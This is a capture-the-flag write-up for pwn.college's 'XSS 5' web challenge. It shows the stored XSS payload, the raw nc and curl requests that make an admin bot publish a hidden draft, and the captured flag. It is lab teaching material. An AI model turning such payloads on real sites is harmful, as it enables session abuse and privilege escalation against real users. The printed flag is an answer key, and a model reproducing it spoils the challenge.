---
layout: page
title: "🛡️ XSS 5 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 📁 Challenge Information

- **Category**: Web Exploitation
- **Challenge Name**: XSS 5
- **Platform**: pwn.college
- **Tags**: `XSS`, `Stored XSS`, `Session`, `JavaScript`, `Cookie`, `CSRF`, `Privilege Escalation`

---

## 🔍 Description

This challenge involves stored cross-site scripting (XSS) in a Flask blogging platform with basic user authentication and draft publishing. The goal is to exploit stored XSS to escalate privileges and extract the flag.

---

## 📜 Server Source Code Highlights

- Posts are stored in an SQLite database.
- Authenticated users can:
  - Submit new posts via `/draft`
  - Publish drafts via `/publish`
- Posts can be **drafts** or **published**
- Published posts are shown in full; drafts show only 12 characters
- Users login via `/login`, setting a session cookie

### Key Vulnerable Code:

```python
content = flask.request.form.get("content", "")
db.execute(
    "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
    (content, flask.session.get("username"), bool(flask.request.form.get("publish"))),
)
```

- **User-controlled content** is inserted **directly** into HTML pages.

---

## 🧠 Exploitation Strategy

- Login as user `hacker` with password `1337`
- Inject malicious JavaScript in a **published** post via `/draft`
- Use `<script>` to make the **victim (admin bot)** visit `/publish`, which will auto-publish admin's draft containing the flag
- Then view published admin posts to get the flag

---

## 🧪 Steps to Exploit

### 1. Login as `hacker`

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```

✔️ Gets session cookie:
```
session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH2Sqw.y37LtS4n1cbnXd3TKeAUXgudk7E
```

---

### 2. Inject Payload via /draft

Payload:
```html
<script>fetch('http://challenge.localhost/publish')</script>
```

HTTP Request:
```bash
printf "POST /draft HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:79\r\nCookie:session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH2Sqw.y37LtS4n1cbnXd3TKeAUXgudk7E\r\n\r\ncontent=<script>fetch('http://challenge.localhost/publish')</script>&publish=on" | nc challenge.localhost 80
```

✅ The post is now published and will execute JS in any visitor’s browser (including the bot).

---

### 3. Trigger Victim Visit

```bash
/challenge/victim
```

✔️ Bot visits home page, executes injected JS, and makes a GET request to `/publish` as **admin**

---

### 4. Re-login and View Admin's Published Post

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```

Copy new session cookie from response.

Then:

```bash
curl -b "session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH2S3g.VbKjGM-Rm5oA5HJV-E2nFw6fEcw" http://challenge.localhost/
```

✔️ Output includes:

```html
<h2>Author: admin</h2>pwn.college{8Qa3k3ZIdM56U9sB0WZHIZ3rw_c.QX2kzMzwSM0IzMyEzW}
```

---

## 🏁 Flag

```
pwn.college{8Qa3k3ZIdM56U9sB0WZHIZ3rw_c.QX2kzMzwSM0IzMyEzW}
```

---

